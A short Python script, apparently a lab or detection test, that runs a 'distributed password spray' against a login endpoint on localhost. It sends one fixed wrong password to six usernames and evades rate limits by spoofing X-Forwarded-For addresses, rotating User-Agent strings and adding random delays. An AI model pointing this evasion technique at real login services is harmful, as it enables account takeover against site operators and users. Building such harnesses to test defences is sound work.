import requests
import sys
import time
import random
from itertools import cycle

TARGET = "http://127.0.0.1:5000/login"

USERS = [
    "admin",
    "user1",
    "user2",
    "user3",
    "user4",
    "user5",
]

PASSWORD = "wrongpassword"

IP_POOL = [
    "10.10.11.11",
    "10.10.11.12",
    "10.10.11.13",
    "10.10.11.14",
    "10.10.11.15",
    "10.10.11.16",
]

TIMEOUT = 3

ip_cycle = cycle(IP_POOL)


def spray():
    print("[CLI] Running DISTRIBUTED password spray (REALISTIC)\n")

    for user in USERS:
        fake_ip = next(ip_cycle)

        headers = {
            "X-Forwarded-For": fake_ip,
            "User-Agent": random.choice([
                "Mozilla/5.0",
                "curl/7.88.1",
                "python-requests/2.31.0",
            ])
        }

        try:
            r = requests.post(
                TARGET,
                data={
                    "username": user,
                    "password": PASSWORD
                },
                headers=headers,
                timeout=TIMEOUT
            )

            print(f"[LIVE] {fake_ip} -> {user} ({r.status_code})")

            time.sleep(random.uniform(0.7, 2.2))

        except requests.RequestException as e:
            print(f"[ERROR] Request failed: {e}")
            sys.exit(2)


if __name__ == "__main__":
    spray()
    print("\n[CLI] Distributed password spray FINISHED")
    sys.exit(0)
